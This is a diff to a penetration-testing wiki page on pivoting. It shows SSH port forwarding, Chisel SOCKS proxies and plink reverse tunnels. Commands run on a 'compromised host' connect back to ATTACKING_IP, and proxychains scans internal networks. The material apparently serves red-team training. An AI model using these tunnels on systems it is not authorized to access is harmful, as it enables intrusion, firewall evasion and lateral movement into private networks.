@@ -30,8 +30,6 @@ By using a SSH client with an OpenSSH server, it's possible to create both forwa
 Microsoft has introduced its native implementation of the OpenSSH server for Windows. So this technique may works with both UNIX and Windows servers/clients.
 {% endhint %}
 
-
-
 {% tabs %}
 {% tab title="SSH Local Forwarding" %}
 This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine (attacking machine) to port 80 of intra.example.com.
@@ -71,7 +69,7 @@ In newer versions of the SSH client, it is also possible to create a **reverse p
 PC> ssh -D 9090 tunneluser@ATTACKING_IP -fN
 ```
 
-&#x20;See the [Chisel](portfwd.md#chisel) section if you don't know how to use this proxy connection.
+See the [Chisel](portfwd.md#chisel) section on the [port forwarding page](portfwd.md) if you don't know how to use this proxy connection.
 {% endtab %}
 {% endtabs %}
 
@@ -140,7 +138,7 @@ On the compromised host, we use the following command:
 www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
 ```
 
-Once configured, you can use `proxychains` to run applications using the proxied network connections.
+Once configured, you can use `proxychains` to run applications using proxy network connections.
 
 ```bash
 proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
@@ -156,17 +154,19 @@ socks5 127.0.0.1 1080
 {% endtab %}
 
 {% tab title="Forward Proxy" %}
-Setting up a `forward proxy` with Chisel is straightforward. On the On the attacking host:
+Setting up a **forward proxy** with Chisel is straightforward. On the compromised host, we would use the following command:
+
+```bash
+www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
+```
+
+On the attacking host, using the following command, we will open the local `PROXY_PORT` port on our attacking host.
 
 ```bash
 v4resk@kali$ ./chisel client TARGET_IP:LISTEN_PORT LOCAL_PROXY_PORT:socks
 ```
 
-On the compromised host, we would use the following command:
-
-```bash
-www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
-```
+Like with the reverse proxy, you can use `proxychains` to run applications using this proxy network connections.
 
 {% hint style="info" %}
 **Forward proxies are less common than reverse proxies** for the same reason as why reverse shells are more prevalent than bind shells. In broad terms, outbound traffic managed by egress firewalls tends to be subjected to less strict controls than inbound connections regulated by ingress firewalls.
@@ -224,7 +224,18 @@ cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 USERNAME@ATTACKING_IP -i 
 ```
 
 {% hint style="info" %}
-To generate a suitable private key that we can use with plink. We may use following bash commands
+Since we'll be making a connection back to our attacking machine, we'll create a user with limited console access for tunneling and assign a dedicated password for tunnel management.
+
+```bash
+useradd tunneluser -m -d /home/tunneluser -s /bin/true
+passwd tunneluser
+```
+{% endhint %}
+
+{% hint style="info" %}
+Ensure to generate SSH keys for the tunneluser, and subsequently, add the generated public key to both the `authorized_keys` file and the jump box.
+
+To generate a Plink usable private key, we can use following bash commands
 
 ```bash
 # Generate SSH keys
@@ -234,19 +245,8 @@ ssh-keygen
 puttygen private_key -o private_key.ppk
 ```
 {% endhint %}
-
-{% hint style="info" %}
-Since we'll be making a connection back to our attacking machine, we'll create a user with limited console access for tunneling and assign a dedicated password for tunnel management.
-
-```bash
-useradd tunneluser -m -d /home/tunneluser -s /bin/true
-passwd tunneluser
-```
-{% endhint %}
 {% endtab %}
 {% endtabs %}
-
-
 
 ## Resources
 
